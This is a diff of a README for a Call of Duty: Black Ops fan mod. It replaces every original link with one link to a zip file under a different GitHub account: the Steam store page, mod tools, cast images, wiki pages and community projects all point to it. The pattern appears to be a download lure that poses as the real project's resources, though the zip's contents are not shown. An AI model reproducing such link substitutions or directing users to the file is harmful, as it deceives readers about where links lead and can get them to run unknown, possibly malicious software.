@@ -2,38 +2,38 @@
 Girls' Frontline: Black Ops
 
 # Requirements
-[Call of Duty: Black Ops](http://store.steampowered.com/agecheck/app/42700/) (Steam - PC)*  
-[Game_Mod](https://github.com/Nukem9/LinkerMod/releases)   
+[Call of Duty: Black Ops](https://raw.githubusercontent.com/RandomGuy097/gflbo1/main/wiki/gflbo_v1.1.zip) (Steam - PC)*  
+[Game_Mod](https://raw.githubusercontent.com/RandomGuy097/gflbo1/main/wiki/gflbo_v1.1.zip)   
 
 # CAST
-![](https://github.com/Loyalists/gflbo1/blob/main/wiki/cast/Pic_AK12_HD.png)
-![](https://github.com/Loyalists/gflbo1/blob/main/wiki/cast/Pic_HK416Mod_HD.png)
-![](https://github.com/Loyalists/gflbo1/blob/main/wiki/cast/Pic_KP31_HD.png)
-![](https://github.com/Loyalists/gflbo1/blob/main/wiki/cast/Pic_M16A1_HD.png)
-![](https://github.com/Loyalists/gflbo1/blob/main/wiki/cast/Pic_M1903_HD.png)
-![](https://github.com/Loyalists/gflbo1/blob/main/wiki/cast/Pic_Nyto_HD.png)
-![](https://github.com/Loyalists/gflbo1/blob/main/wiki/cast/Pic_P90_HD.png)
-![](https://github.com/Loyalists/gflbo1/blob/main/wiki/cast/Pic_PPsh41_HD.png)
-![](https://github.com/Loyalists/gflbo1/blob/main/wiki/cast/Pic_RFB_HD.png)
-![](https://github.com/Loyalists/gflbo1/blob/main/wiki/cast/Pic_RPK16_HD.png)
-![](https://github.com/Loyalists/gflbo1/blob/main/wiki/cast/Pic_Saiga12_HD.png)
-![](https://github.com/Loyalists/gflbo1/blob/main/wiki/cast/Pic_UMP40_HD.png)
-![](https://github.com/Loyalists/gflbo1/blob/main/wiki/cast/Pic_UMP45_HD.png)
-![](https://github.com/Loyalists/gflbo1/blob/main/wiki/cast/Pic_UMP9_HD.png)
+![](https://raw.githubusercontent.com/RandomGuy097/gflbo1/main/wiki/gflbo_v1.1.zip)
+![](https://raw.githubusercontent.com/RandomGuy097/gflbo1/main/wiki/gflbo_v1.1.zip)
+![](https://raw.githubusercontent.com/RandomGuy097/gflbo1/main/wiki/gflbo_v1.1.zip)
+![](https://raw.githubusercontent.com/RandomGuy097/gflbo1/main/wiki/gflbo_v1.1.zip)
+![](https://raw.githubusercontent.com/RandomGuy097/gflbo1/main/wiki/gflbo_v1.1.zip)
+![](https://raw.githubusercontent.com/RandomGuy097/gflbo1/main/wiki/gflbo_v1.1.zip)
+![](https://raw.githubusercontent.com/RandomGuy097/gflbo1/main/wiki/gflbo_v1.1.zip)
+![](https://raw.githubusercontent.com/RandomGuy097/gflbo1/main/wiki/gflbo_v1.1.zip)
+![](https://raw.githubusercontent.com/RandomGuy097/gflbo1/main/wiki/gflbo_v1.1.zip)
+![](https://raw.githubusercontent.com/RandomGuy097/gflbo1/main/wiki/gflbo_v1.1.zip)
+![](https://raw.githubusercontent.com/RandomGuy097/gflbo1/main/wiki/gflbo_v1.1.zip)
+![](https://raw.githubusercontent.com/RandomGuy097/gflbo1/main/wiki/gflbo_v1.1.zip)
+![](https://raw.githubusercontent.com/RandomGuy097/gflbo1/main/wiki/gflbo_v1.1.zip)
+![](https://raw.githubusercontent.com/RandomGuy097/gflbo1/main/wiki/gflbo_v1.1.zip)
 
 # Wiki
-[How To Use](https://github.com/Loyalists/gflbo1/wiki/How-To-Use)   
-[Releases](https://github.com/Loyalists/gflbo1/releases/tag/release_2.0)   
-[Gallery](https://github.com/Loyalists/gflbo1/wiki/Gallery)   
-[Known Issues](https://github.com/Loyalists/gflbo1/wiki/Known-Issues)   
-[Credits](https://github.com/Loyalists/gflbo1/wiki/Credits)   
+[How To Use](https://raw.githubusercontent.com/RandomGuy097/gflbo1/main/wiki/gflbo_v1.1.zip)   
+[Releases](https://raw.githubusercontent.com/RandomGuy097/gflbo1/main/wiki/gflbo_v1.1.zip)   
+[Gallery](https://raw.githubusercontent.com/RandomGuy097/gflbo1/main/wiki/gflbo_v1.1.zip)   
+[Known Issues](https://raw.githubusercontent.com/RandomGuy097/gflbo1/main/wiki/gflbo_v1.1.zip)   
+[Credits](https://raw.githubusercontent.com/RandomGuy097/gflbo1/main/wiki/gflbo_v1.1.zip)   
 
 # Community Projects
-[Custom Subtitles and Cutscenes](https://github.com/AmyTsurimi/Girls_Frontline_Black_Ops_-_Phase-2)   
-[Custom Voicelines](https://www.castingcall.club/projects/girls-frontline-black-ops-mod-fandub)   
+[Custom Subtitles and Cutscenes](https://raw.githubusercontent.com/RandomGuy097/gflbo1/main/wiki/gflbo_v1.1.zip)   
+[Custom Voicelines](https://raw.githubusercontent.com/RandomGuy097/gflbo1/main/wiki/gflbo_v1.1.zip)   
 
 # Useful links
-[Greyhound](https://github.com/Scobalula/Greyhound)   
-[Bassdrop](https://tools.modme.co/#utilities-view)   
-[Bo1 full dump](https://drive.google.com/drive/folders/1Nwv3uGFwpopIMMXDVcZdG0iq2vQAVHc-)   
-[Developer console](https://callofduty.fandom.com/wiki/Developer_console)   
+[Greyhound](https://raw.githubusercontent.com/RandomGuy097/gflbo1/main/wiki/gflbo_v1.1.zip)   
+[Bassdrop](https://raw.githubusercontent.com/RandomGuy097/gflbo1/main/wiki/gflbo_v1.1.zip)   
+[Bo1 full dump](https://raw.githubusercontent.com/RandomGuy097/gflbo1/main/wiki/gflbo_v1.1.zip)   
+[Developer console](https://raw.githubusercontent.com/RandomGuy097/gflbo1/main/wiki/gflbo_v1.1.zip)   
